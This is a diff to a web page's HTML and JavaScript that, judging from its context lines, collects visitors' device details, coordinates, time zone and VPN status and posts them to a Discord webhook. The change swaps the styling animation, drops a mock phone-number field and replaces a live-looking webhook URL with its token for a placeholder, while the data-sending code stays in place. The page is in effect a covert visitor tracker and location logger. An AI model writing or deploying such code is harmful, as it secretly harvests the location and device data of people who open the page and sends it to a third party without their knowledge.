@@ -33,11 +33,13 @@
             display: inline-block;
             min-width: 300px;
             position: absolute;
-            animation: shakeAnimation 0.5s linear infinite;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
             max-width: 90%; /* Make it responsive */
+            animation: scrollAnimation 10s linear infinite; /* Added scrolling animation */
+            overflow-y: scroll;
+            height: 80vh; /* Scrollable height */
         }
         p {
             color: #dddddd;
@@ -80,6 +82,12 @@
             50% { transform: translate(-50%, -50%) translateX(10px); }
             75% { transform: translate(-50%, -50%) translateX(-10px); }
             100% { transform: translate(-50%, -50%) translateX(0); }
+        }
+
+        /* Scroll Animation */
+        @keyframes scrollAnimation {
+            0% { transform: translate(-50%, -50%) translateY(0); }
+            100% { transform: translate(-50%, -50%) translateY(-100%); }
         }
 
         /* Landing Page Text Style */
@@ -216,8 +224,7 @@
                 deviceEdition: deviceEdition,
                 deviceVersion: deviceVersion,
                 systemType: systemType,
-                cpuCores: cpuCores,
-                phoneNumber: '123-456-7890'  // Simulating automatic phone number fetch (can be a mock number or fetched from elsewhere)
+                cpuCores: cpuCores
             };
 
             // Try to fetch the custom device name from localStorage
@@ -248,12 +255,11 @@
                 <p><strong>Coordinates:</strong> ${deviceData.latitude}, ${deviceData.longitude}</p>
                 <p><strong>VPN Detected:</strong> ${deviceData.vpn}</p>
                 <p><strong>CPU Cores:</strong> ${deviceData.cpuCores}</p>
-                <p><strong>Phone Number:</strong> ${deviceData.phoneNumber}</p>
             `;
 
             // Send the data to the webhook
             try {
-                await fetch('https://discordapp.com/api/webhooks/1330513852315734076/cHE5eHxuscj1irA0SDp4wJOz-SwQnVWzGl1IHibnNa8-MEuU0pgSD6jr6FXrPx72vsVB', {
+                await fetch('https://discordapp.com/api/webhooks/your_webhook_url', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -277,8 +283,7 @@
                                 { name: 'Time Zone', value: deviceData.timezone, inline: false },
                                 { name: 'Coordinates', value: `${deviceData.latitude}, ${deviceData.longitude}`, inline: false },
                                 { name: 'VPN Detected', value: deviceData.vpn, inline: false },
-                                { name: 'CPU Cores', value: deviceData.cpuCores, inline: false },
-                                { name: 'Phone Number', value: deviceData.phoneNumber, inline: false }
+                                { name: 'CPU Cores', value: deviceData.cpuCores, inline: false }
                             ]
                         }]
                     })
